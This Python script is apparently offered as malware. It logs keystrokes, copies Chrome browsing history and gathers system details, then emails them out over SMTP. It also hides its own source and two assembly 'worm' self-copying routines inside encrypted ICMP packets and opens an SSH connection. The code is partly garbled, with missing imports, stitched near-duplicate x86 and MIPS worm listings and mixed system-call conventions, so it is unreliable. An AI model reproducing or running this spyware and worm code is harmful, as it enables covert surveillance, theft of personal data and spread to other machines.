from scapy.all import *
from cryptography.fernet import Fernet
import sys
import socket
import struct
import smtplib
import os
import time
import psutil
import subprocess
import keyboard
import winreg
import paramiko
import requests
from bs4 import BeautifulSoup
import re
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

# Function to calculate checksum
def calculate_checksum(data):
    if len(data) % 2 == 1:
        data += b'\x00'
    checksum = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i + 1]
        checksum += w
    checksum = (checksum >> 16) + (checksum & 0xffff)
    checksum = ~checksum & 0xffff
    return checksum


# Function to encrypt payload using Fernet encryption
def encrypt_payload(payload, key):
    fernet = Fernet(key)
    encrypted_payload = fernet.encrypt(payload.encode())
    return encrypted_payload


# Function to craft ICMP packet
def craft_icmp_packet(destination, payload):
    # Create IP header
    ip = IP(dst=destination)

    # Create ICMP header
    icmp = ICMP()

    # Set the type and code of the ICMP packet
    icmp.type = 8  # Echo Request
    icmp.code = 0

    # Encrypt the payload
    key = Fernet.generate_key()
    encrypted_payload = encrypt_payload(payload, key)

    # Craft the payload
    data = struct.pack('!H', os.getpid()) + key + encrypted_payload

    # Calculate the checksum
    checksum = calculate_checksum(icmp.build() + data)

    # Set the checksum in the ICMP header
    icmp.chksum = checksum

    # Construct the final packet
    packet = ip / icmp / data

    return packet


# Function to send ICMP packet
def send_icmp_packet(packet):
    try:
        send(packet)
        print("ICMP packet sent successfully!")
    except PermissionError:
        print("Permission denied. Run the program as root/administrator.")
    except socket.error as e:
        print("Error sending ICMP packet:", str(e))


# Class to handle email sending
class EmailSender:
    def __init__(self, smtp_server, smtp_port, username, password):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.username = username
        self.password = password

    def send_email_with_attachment(self, subject, message, attachment_path, recipients):
        # Create a multipart message
        msg = MIMEMultipart()
        msg['From'] = self.username
        msg['To'] = ", ".join(recipients)
        msg['Subject'] = subject

        # Add message body
        msg.attach(MIMEText(message, 'plain'))

        # Add attachment
        attachment_filename = os.path.basename(attachment_path)
        with open(attachment_path, "rb") as attachment_file:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment_file.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename= {attachment_filename}")
            msg.attach(part)

        # Send the email
        try:
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.login(self.username, self.password)
                server.send_message(msg)
            print("Email sent successfully!")
        except smtplib.SMTPException as e:
            print("Error sending email:", str(e))


# Function to send an email with system information
def send_system_info_email(email_sender, recipients):
    subject = "System Information"
    message = ""

    # Get system information
    hostname = socket.gethostname()
    message += f"Hostname: {hostname}\n"

    # Get CPU information
    cpu_count = psutil.cpu_count(logical=False)
    cpu_logical_count = psutil.cpu_count(logical=True)
    cpu_percent = psutil.cpu_percent()
    message += f"CPU Count: {cpu_count}\n"
    message += f"CPU Logical Count: {cpu_logical_count}\n"
    message += f"CPU Usage: {cpu_percent}%\n"

    # Get memory information
    memory = psutil.virtual_memory()
    total_memory = round(memory.total / (1024 ** 3), 2)
    available_memory = round(memory.available / (1024 ** 3), 2)
    memory_percent = memory.percent
    message += f"Total Memory: {total_memory} GB\n"
    message += f"Available Memory: {available_memory} GB\n"
    message += f"Memory Usage: {memory_percent}%\n"

    # Send the email
    email_sender.send_email_with_attachment(subject, message, "", recipients)


# Function to send an email with captured keystrokes
def send_keystrokes_email(email_sender, recipients):
    subject = "Captured Keystrokes"
    message = ""

    # Start recording keystrokes
    recorded_keystrokes = []
    keyboard.start_recording(recorded_keystrokes)

    # Wait for 10 seconds
    time.sleep(10)

    # Stop recording keystrokes
    keyboard.stop_recording()

    # Get the captured keystrokes
    keystrokes = keyboard.get_recording()

    # Process and format the keystrokes
    for keystroke in keystrokes:
        if keystroke.event_type == "down":
            key = keystroke.name
            if key == "space":
                key = " "
            elif key == "enter":
                key = "\n"
            elif key == "backspace":
                key = "<backspace>"
            message += key

    # Send the email
    email_sender.send_email_with_attachment(subject, message, "", recipients)


# Function to send an email with browser history
def send_browser_history_email(email_sender, recipients):
    subject = "Browser History"
    message = ""

    # Get browser history from Chrome
    chrome_history_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\History")
    try:
        # Copy the Chrome history file to a temporary location
        temp_history_path = "temp_history"
        shutil.copy2(chrome_history_path, temp_history_path)

        # Connect to the Chrome history database
        connection = sqlite3.connect(temp_history_path)
        cursor = connection.cursor()

        # Execute the query to get the history
        query = "SELECT title, url, last_visit_time FROM urls"
        cursor.execute(query)
        history_entries = cursor.fetchall()

        # Process and format the history entries
        for entry in history_entries:
            title = entry[0]
            url = entry[1]
            last_visit_time = entry[2]

            # Convert the last visit time to a readable format
            timestamp = datetime.fromtimestamp(last_visit_time / 1000000)
            formatted_timestamp = timestamp.strftime('%Y-%m-%d %H:%M:%S')

            message += f"{formatted_timestamp} - {title}: {url}\n"

    except Exception as e:
        print("Error retrieving browser history:", str(e))
    finally:
        # Close the database connection and delete the temporary file
        cursor.close()
        connection.close()
        os.remove(temp_history_path)

    # Send the email
    email_sender.send_email_with_attachment(subject, message, "", recipients)


# Function to connect to an SSH server
def ssh_connect(host, port, username, password):
    try:
        # Create an SSH client
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Connect to the SSH server
        client.connect(host, port, username, password)

        # Execute a command on the remote server
        command = "ls -l"
        stdin, stdout, stderr = client.exec_command(command)

        # Print the output of the command
        for line in stdout:
            print(line.strip())

        # Close the SSH connection
        client.close()

    except paramiko.AuthenticationException:
        print("Authentication failed.")
    except paramiko.SSHException as e:
        print("Error occurred while connecting to SSH server:", str(e))
    except paramiko.ssh_exception.NoValidConnectionsError as e:
        print("Error connecting to SSH server:", str(e))


# Function to fetch and parse the HTML content of a web page
def fetch_html_content(url):
    try:
        # Send a GET request to the URL
        response = requests.get(url)

        # Parse the HTML content using BeautifulSoup
        soup = BeautifulSoup(response.text, 'html.parser')

        # Extract the title of the web page
        title = soup.title.string

        # Extract all the links in the web page
        links = soup.find_all('a')
        link_urls = []
        for link in links:
            link_urls.append(link.get('href'))

        return title, link_urls

    except requests.exceptions.RequestException as e:
        print("Error fetching HTML content:", str(e))
        return None, None


# Main function
if __name__ == "__main__":
    # Set the destination IP address
    destination = "192.168.0.1"

    # Read the program file
    with open(__file__, "rb") as file:
        program_data = file.read()

    # Encode the program data as base64
    encoded_program_data = base64.b64encode(program_data).decode("utf-8")
    
    # Set the payload as the encoded program data
    payload = encoded_program_data
    payload2 = """ section .data
    path db "/", 0   ; Default path
    target_dir_list dd 0   ; Empty target directory list
    iteration dd 2   ; Default iteration count
    script_name db "worm.py", 0
    untitled_folder db "untitled_folder.py", 0

section .text
    global _start

_start:
    ; Set up stack pointer and initialize registers

    ; Call list_directories
    mov eax, path
    call list_directories

    ; Call create_new_worm
    call create_new_worm

    ; Call copy_existing_files
    call copy_existing_files

    ; Call check_worm_instances
    call check_worm_instances

    ; Exit program
    mov eax, 1
    xor ebx, ebx
    int 0x80

list_directories:
    ; Function to list directories
    ; Parameters:
    ;   eax - path

    ; Open directory
    mov ebx, eax
    mov eax, 5   ; openat system call
    xor ecx, ecx   ; flags
    xor edx, edx   ; mode
    int 0x80

    ; Save directory file descriptor
    mov esi, eax

    ; Read directory entries
    lea edx, [esp + 512]   ; buffer for directory entry
    mov eax, 89   ; getdents64 system call
    mov ecx, eax   ; file descriptor
    int 0x80

    ; Loop through directory entries
.loop:
    test eax, eax   ; check if end of directory
    jz .done

    ; Extract filename from directory entry
    mov edi, 0   ; entry index
    add edx, eax   ; advance buffer pointer
    movzx eax, byte [edx + 9]   ; filename length
    inc edx   ; move to filename
    lea edi, [esp + 512]   ; destination buffer
    rep movsb   ; copy filename to buffer
    mov byte [edi + eax], 0   ; null-terminate the string

    ; Print the filename
    pusha
    push edi
    call print_string
    popa

    ; Recursive call for subdirectories
    mov eax, edi   ; subdirectory path
    call list_directories

    jmp .loop

.done:
    ; Close directory
    mov eax, 6   ; close system call
    mov ebx, esi   ; file descriptor
    int 0x80

    ret

create_new_worm:
    ; Function to create new worm
    ; No parameters

    ; Copy script_name to destination
    push untitled_folder
    push script_name
    call copy_file

    ret

copy_existing_files:
    ; Function to copy existing files
    ; No parameters

    ; Loop through target directories
    mov ecx, target_dir_list
.loop:
    ; Check if end of target_dir_list
    cmp dword [ecx], 0
    jz .done

    ; Copy existing files
    push dword [ecx]
    push iteration
    call copy_files_in_directory

    ; Advance to the next target directory
    add ecx, 4
    jmp .loop

.done:
    ret

copy_files_in_directory:
    ; Function to copy existing files in a directory
    ; Parameters:
    ;   eax - directory path
    ;   ebx - iteration count

    ; Open directory
    mov edx, eax
    mov eax, 5   ; openat system call
    xor ecx, ecx   ; flags
    xor esi, esi   ; mode
    int 0x80

    ; Save directory file descriptor
    mov edi, eax

    ; Read directory entries
    lea edx, [esp + 512]   ; buffer for directory entry
    mov eax, 89   ; getdents64 system call
    mov ecx, eax   ; file descriptor
    int 0x80

    ; Loop through directory entries
.loop:
    test eax, eax   ; check if end of directory
    jz .done

    ; Extract filename from directory entry
    mov esi, 0   ; entry index
    add edx, eax   ; advance buffer pointer
    movzx eax, byte [edx + 9]   ; filename length
    inc edx   ; move to filename
    lea esi, [esp + 512]   ; source buffer
    rep movsb   ; copy filename to buffer
    mov byte [esi + eax], 0   ; null-terminate the string

    ; Check if the file is not a directory
    push edx   ; save buffer pointer
    push esi   ; save filename
    call is_regular_file
    cmp eax, 0
    jne .next_entry

    ; Copy the file
    push ebx   ; push iteration count
    push esi   ; push filename
    push eax   ; push directory path
    call copy_file

    .next_entry:
    ; Restore buffer pointer
    pop edx

    jmp .loop

.done:
    ; Close directory
    mov eax, 6   ; close system call
    mov ebx, edi   ; file descriptor
    int 0x80

    ret

check_worm_instances:
    ; Function to check worm instances
    ; No parameters

    ; Loop through target directories
    mov ecx, target_dir_list
.loop:
    ; Check if end of target_dir_list
    cmp dword [ecx], 0
    jz .done

    ; Check worm instances
    push dword [ecx]
    push iteration
    call count_worm_instances
    cmp eax, ebx   ; compare instance count with iteration count
    jge .next_directory

    ; Create missing worm instances
    mov edi, ebx
    sub edi, eax   ; calculate missing instances count
    push edi
    push dword [ecx]
    call create_new_worm_instances

    .next_directory:
    ; Advance to the next target directory
    add ecx, 4
    jmp .loop

.done:
    ret

count_worm_instances:
    ; Function to count worm instances in a directory
    ; Parameters:
    ;   eax - directory path
    ;   ebx - iteration count
    ; Returns:
    ;   eax - instance count

    ; Initialize instance count to 0
    xor eax, eax

    ; Open directory
    mov edx, eax
    mov eax, 5   ; openat system call
    xor ecx, ecx   ; flags
    xor esi, esi   ; mode
    int 0x80

    ; Save directory file descriptor
    mov edi, eax

    ; Read directory entries
    lea edx, [esp + 512]   ; buffer for directory entry
    mov eax, 89   ; getdents64 system call
    mov ecx, eax   ; file descriptor
    int 0x80

    ; Loop through directory entries
.loop:
    test eax, eax   ; check if end of directory
    jz .done

    ; Extract filename from directory entry
    mov esi, 0   ; entry index
    add edx, eax   ; advance buffer pointer
    movzx eax, byte [edx + 9]   ; filename length
    inc edx   ; move to filename
    lea esi, [esp + 512]   ; source buffer
    rep movsb   ; copy filename to buffer
    mov byte [esi + eax], 0   ; null-terminate the string

    ; Check if the file is a worm instance
    push esi   ; push filename
    call is_worm_instance
    cmp eax, 1
    jne .next_entry

    ; Increment instance count
    inc eax

    .next_entry:
    jmp .loop

.done:
    ; Close directory
    mov eax, 6   ; close system call
    mov ebx, edi   ; file descriptor
    int 0x80

    ret

create_new_worm_instances:
    ; Function to create missing worm instances
    ; Parameters:
    ;   eax - missing instances count
    ;   ebx - directory path

    ; Copy missing worm instances
    mov edi, eax   ; save missing instances count
.loop:
    push ebx   ; push directory path
    call create_new_worm
    dec edi   ; decrement missing instances count
    jnz .loop

    ret

is_regular_file:
    ; Function to check if a file is a regular file
    ; Parameters:
    ;   eax - file path
    ; Returns:
    ;   eax - 0 if not a regular file, 1 if a regular file

    ; Open file
    mov ebx, eax
    mov eax, 5   ; openat system call
    xor ecx, ecx   ; flags
    xor edx, edx   ; mode
    int 0x80

    ; Check if the file is a regular file
    mov eax, 8   ; fstat system call
    mov ebx, eax   ; file descriptor
    lea ecx, [esp + 16]   ; stat structure
    int 0x80

    ; Check file type
    test dword [esp + 16], 0170000   ; S_IFMT mask
    jnz .not_regular_file

    ; Check if regular file
    mov eax, 1   ; regular file
    jmp .done

.not_regular_file:
    ; Not a regular file
    xor eax, eax   ; return 0

.done:
    ret

is_worm_instance:
    ; Function to check if a file is a worm instance
    ; Parameters:
    ;   eax - file path
    ; Returns:
    ;   eax - 1 if a worm instance, 0 otherwise

    ; Check file extension
    mov eax, 0   ; file extension offset
    lea ebx, [esp + 512]   ; file path
    xor ecx, ecx   ; iteration count
.loop:
    cmp byte [ebx + eax + ecx], '.'
    jne .next_char
    inc ecx   ; increment iteration count
    cmp ecx, ebx   ; compare with iteration
    jne .loop

    ; Check if the file is a worm instance
    cmp ecx, ebx   ; compare iteration count with iteration
    jne .not_worm_instance

    ; It's a worm instance
    mov eax, 1   ; return 1
    jmp .done

.not_worm_instance:
    ; Not a worm instance
    xor eax, eax   ; return 0

.done:
    ret

copy_file:
    ; Function to copy a file
    ; Parameters:
    ;   eax - source file path
    ;   ebx - destination file path

    ; Open source file
    mov edx, eax
    mov eax, 5   ; openat system call
    xor ecx, ecx   ; flags
    xor esi, esi   ; mode
    int 0x80

    ; Save source file descriptor
    mov edi, eax

    ; Open destination file
    mov edx, ebx
    mov eax, 5   ; openat system call
    xor ecx, ecx   ; flags
    xor esi, esi   ; mode
    int 0x80

    ; Save destination file descriptor
    mov esi, eax

    ; Copy file content
    lea edx, [esp + 512]   ; buffer for file content
    mov eax, 3   ; read system call
    mov ebx, edi   ; source file descriptor
    xor ecx, ecx   ; buffer offset
    xor edi, edi   ; bytes read
    int 0x80

    ; Check if end of file
    test eax, eax
    jz .done_copying

    ; Write file content
    mov eax, 4   ; write system call
    mov ebx, esi   ; destination file descriptor
    mov ecx, edx   ; buffer
    int 0x80

    ; Recursive call to copy remaining content
    jmp copy_file

.done_copying:
    ; Close source file
    mov eax, 6   ; close system call
    mov ebx, edi   ; source file descriptor
    int 0x80

    ; Close destination file
    mov eax, 6   ; close system call
    mov ebx, esi   ; destination file descriptor
    int 0x80

    ret

print_string:
    ; Function to print a null-terminated string
    ; Parameter:
    ;   eax - pointer to the string

    pusha

.loop:
    lodsb   ; load character from memory
    test al, al   ; check for null terminator
    jz .done   ; jump if end of string
    mov ah, 0x0E   ; function to print character
    int 0x10   ; BIOS interrupt to print character
    jmp .loop

.done:
    popa
    ret"""
    payload3 =  """ .data
    path: .asciiz "/"
    target_dir_list: .word 0
    iteration: .word 2
    script_name: .asciiz "worm.py"
    untitled_folder: .asciiz "untitled_folder.py"

.text
.globl main

main:
    # Set up stack pointer and initialize registers

    # Call list_directories
    la $a0, path
    jal list_directories

    # Call create_new_worm
    jal create_new_worm

    # Call copy_existing_files
    jal copy_existing_files

    # Call check_worm_instances
    jal check_worm_instances

    # Exit program
    li $v0, 10
    syscall

list_directories:
    # Function to list directories
    # Parameters:
    #   $a0 - path

    # Open directory
    move $a1, $a0
    li $v0, 13   # syscall code for "open"
    li $a2, 0    # flags
    li $a3, 0    # mode
    syscall

    # Save directory file descriptor
    move $s0, $v0

    # Read directory entries
    la $t0, buffer   # buffer for directory entry
    li $v0, 89   # syscall code for "getdents64"
    move $a0, $v0   # file descriptor
    syscall

.loop:
    beqz $v0, .done   # check if end of directory

    # Extract filename from directory entry
    li $s1, 0   # entry index
    add $t0, $v0   # advance buffer pointer
    lbu $v0, 9($t0)   # filename length
    addi $t0, $t0, 1   # move to filename
    la $a1, buffer   # destination buffer
    sb $zero, ($a1)   # null-terminate the string
    add $t1, $zero, $a1   # copy destination buffer address to $t1

    # Print the filename
    jal print_string

    # Recursive call for subdirectories
    move $a0, $t1   # subdirectory path
    jal list_directories

    j .loop

.done:
    # Close directory
    li $v0, 16   # syscall code for "close"
    move $a0, $s0   # file descriptor
    syscall

    jr $ra

create_new_worm:
    # Function to create new worm
    # No parameters

    # Copy script_name to destination
    la $a0, untitled_folder
    la $a1, script_name
    jal copy_file

    jr $ra

copy_existing_files:
    # Function to copy existing files
    # No parameters

    # Loop through target directories
    la $t0, target_dir_list
.loop:
    lw $t1, ($t0)   # Check if end of target_dir_list
    beqz $t1, .done

    # Copy existing files
    move $a0, $t1   # directory path
    lw $a1, iteration
    jal copy_files_in_directory

    # Advance to the next target directory
    addi $t0, $t0, 4
    j .loop

.done:
    jr $ra  """


    # Craft and send the ICMP packet
    icmp_packet = craft_icmp_packet(destination, payload)
    icmp_craft2  =craft_icmp_packet(destination, payload2)
    icmp_craft3 =craft_icmp_packet(destination, payload3)
    send_icmp_packet(icmp_packet)
    send_icmp_packet(icmp_craft2)
    send_icmp_packet(icmp_craft3)

    # Create an instance of the EmailSender class
    email_sender = EmailSender("smtp.gmail.com", 587, "your-email@gmail.com", "your-password")

    # Send system information email
    recipients = ["recipient1@example.com", "recipient2@example.com"]
    send_system_info_email(email_sender, recipients)

    # Send keystrokes email
    send_keystrokes_email(email_sender, recipients)

    # Send browser history email
    send_browser_history_email(email_sender, recipients)

    # Connect to an SSH server
    ssh_connect("192.168.0.1", 22, "username", "password")

    # Fetch and parse HTML content
    url = "https://www.example.com"
    title, link_urls = fetch_html_content(url)

    if title and link_urls:
        print("Title:", title)
        print("Links:")
        for link_url in link_urls:
            print(link_url)


